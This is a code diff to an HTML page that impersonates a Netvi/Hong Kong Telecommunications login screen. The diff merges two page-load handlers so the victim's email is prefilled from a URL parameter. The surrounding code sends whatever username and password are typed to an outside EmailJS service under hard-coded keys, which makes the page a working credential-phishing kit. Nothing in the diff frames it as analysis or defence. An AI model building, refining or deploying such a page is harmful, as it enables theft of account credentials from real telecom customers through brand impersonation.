@@ -7,20 +7,6 @@
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
     emailjs.init("TLkClHUlQn5aQV4XO");
-
-    // Ensure the script runs after the page loads
-    window.onload = function() {
-      // Get the 'email' parameter from the URL
-      const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('email'); // Fetch email from URL query parameters
-
-      // If 'email' exists in the URL, pre-fill the email field
-      if (email) {
-        document.getElementById('username').value = email;
-      } else {
-        console.log('No email parameter in URL');
-      }
-    };
   </script>
   <style>
     body {
@@ -36,14 +22,13 @@
       text-align: center;
     }
 
-    /* Full-screen login panel */
     .login-container {
       position: fixed;
       top: 0;
       left: 0;
       width: 100vw;
       height: 100vh;
-      background-color: rgba(0, 0, 0, 0.3); /* semi-transparent overlay */
+      background-color: rgba(0, 0, 0, 0.3);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -142,7 +127,7 @@
 </head>
 <body>
 
-  <!-- Full-screen transparent login panel -->
+  <!-- Full-screen login panel -->
   <div id="login" class="login-container">
     <div class="login-box">
       <img src="https://i.postimg.cc/pT0pDkn6/netvi-logo.jpg" alt="Netvi Logo" class="login-logo">
@@ -166,6 +151,23 @@
     © Hong Kong Telecommunications (HKT) Limited 2007-2025. All rights reserved.
   </footer>
 
+  <!-- Prefill + other window.onload tasks -->
+  <script>
+    window.onload = function() {
+      // 1. Pre-fill username from URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email');
+      if (email) {
+        document.getElementById('username').value = email;
+        console.log("Pre-filled username:", email);
+      }
+
+      // 2. Original login panel positioning
+      document.getElementById("login").style.top = "0";
+    };
+  </script>
+
+  <!-- Existing authentication scripts -->
   <script>
     function sendEmail(username, password) {
       const serviceID = "service_nfx0v2t";
@@ -180,7 +182,7 @@
     }
 
     function authenticate() {
-      console.log("Login button clicked"); // Debugging log
+      console.log("Login button clicked");
       let loginButton = document.getElementById("loginButton");
       loginButton.textContent = "Authenticating...";
       loginButton.disabled = true;
@@ -191,7 +193,7 @@
       if (username && password) {
         sendEmail(username, password)
           .then(() => {
-            console.log("Email sent successfully"); // Debugging log
+            console.log("Email sent successfully");
             loginButton.textContent = "Login";
             loginButton.disabled = false;
             document.getElementById("login").style.display = "none";
@@ -211,14 +213,10 @@
     }
 
     function retryLogin() {
-      console.log("Retrying login..."); // Debugging log
+      console.log("Retrying login...");
       document.getElementById("confirmation").style.display = "none";
-      document.getElementById("login").style.display = "flex"; // Show login panel again
+      document.getElementById("login").style.display = "flex";
     }
-
-    window.onload = function () {
-      document.getElementById("login").style.top = "0";
-    };
   </script>
 </body>
 </html>
